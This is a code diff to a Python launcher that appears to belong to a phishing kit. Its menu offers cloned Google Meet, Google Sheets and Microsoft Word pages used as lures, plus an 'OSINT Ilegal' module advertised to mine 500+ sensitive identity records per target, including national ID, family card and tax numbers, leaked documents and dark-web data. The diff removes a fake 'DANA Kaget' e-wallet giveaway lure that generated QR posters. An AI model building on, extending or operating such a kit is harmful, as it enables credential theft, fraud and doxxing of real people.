@@ -178,20 +178,10 @@ TEMPLATES = {
         "dir": os.path.join(TEMPLATES_DIR, "msword"),
         "public_dir": os.path.join(TEMPLATES_DIR, "msword", "public"),
     },
-    "danakaget": {
-        "name": "DANA Kaget - Klaim DANA",
-        "icon": "[8]",
-        "label": "DANA Kaget Giveaway",
-        "title": "DANA Kaget — Kamu Mendapatkan DANA Kaget!",
-        "description": "Ada yang bagikan DANA Kaget! Klaim sekarang sebelum habis.",
-        "favicon": "danakaget-favicon.svg",
-        "og_image": "/danakaget-favicon.svg",
-        "dir": os.path.join(TEMPLATES_DIR, "danakaget"),
-        "public_dir": os.path.join(TEMPLATES_DIR, "danakaget", "public"),
-    },
+
     "osint": {
         "name": "OSINT Ilegal - Massive Data Miner (500+ data)",
-        "icon": "[9]",
+        "icon": "[8]",
         "label": "500+ data points: NIK, KK, NPWP, dokumen bocor, finansial, medsos, dark web",
         "title": "OSINT Ilegal — Massive Identity Data Mining",
         "description": "Kumpulkan 500+ data identitas sensitif per target dari 30+ scanners. Export Excel 12+ sheet.",
@@ -256,8 +246,7 @@ def banner():
     print(f"  {C.TEAL}[5]{C.RST}  Google Meet  {C.SLATE}Video Conference Clone{C.RST}")
     print(f"  {C.TEAL}[6]{C.RST}  Google Sheets  {C.SLATE}Laporan Praktikum Basis Data{C.RST}")
     print(f"  {C.TEAL}[7]{C.RST}  Microsoft Word  {C.SLATE}Laporan Praktikum Basis Data (Makalah){C.RST}")
-    print(f"  {C.TEAL}[8]{C.RST}  DANA Kaget  {C.SLATE}Klaim Saldo DANA Gratis{C.RST}")
-    print(f"  {C.TEAL}[9]{C.RST}  OSINT Ilegal  {C.SLATE}Massive Data Mining (500+ data points/target){C.RST}")
+    print(f"  {C.TEAL}[8]{C.RST}  OSINT Ilegal  {C.SLATE}Massive Data Mining (500+ data points/target){C.RST}")
     print()
 
 
@@ -972,17 +961,6 @@ class Engine:
         print()
         if url:
             print(f"  {C.EMER}[v]{C.RST} {'url'.ljust(16)}: {C.B}{url}{C.RST}")
-            if self.current_template == "danakaget":
-                try:
-                    subprocess.run(
-                        ["python", "templates/danakaget/generate_qr.py", url],
-                        cwd=self.app_dir,
-                        capture_output=True,
-                        check=True
-                    )
-                    print(f"  {C.EMER}[v]{C.RST} {'qr_poster'.ljust(16)}: {C.B}dana_kaget_ready.jpg{C.RST} (Tersimpan di folder root)")
-                except Exception as e:
-                    print(f"  {C.CORAL}[x]{C.RST} {'qr_poster'.ljust(16)}: Gagal membuat QR Poster ({e})")
         print(f"  {C.EMER}[v]{C.RST} {'local'.ljust(16)}: http://localhost:{self.app_port}")
         print()
 
@@ -1081,8 +1059,7 @@ def main():
     print(f"  {C.TEAL}[5]{C.RST}  Google Meet  {C.SLATE}Video Conference Clone{C.RST}")
     print(f"  {C.TEAL}[6]{C.RST}  Google Sheets  {C.SLATE}Laporan Praktikum Basis Data{C.RST}")
     print(f"  {C.TEAL}[7]{C.RST}  Microsoft Word  {C.SLATE}Laporan Praktikum Basis Data (Makalah){C.RST}")
-    print(f"  {C.TEAL}[8]{C.RST}  DANA Kaget  {C.SLATE}Klaim Saldo DANA Gratis{C.RST}")
-    print(f"  {C.TEAL}[9]{C.RST}  OSINT Ilegal  {C.SLATE}Massive Data Mining (500+ data){C.RST}")
+    print(f"  {C.TEAL}[8]{C.RST}  OSINT Ilegal  {C.SLATE}Massive Data Mining (500+ data){C.RST}")
     print()
 
     tmpl_keys = list(TEMPLATES.keys())
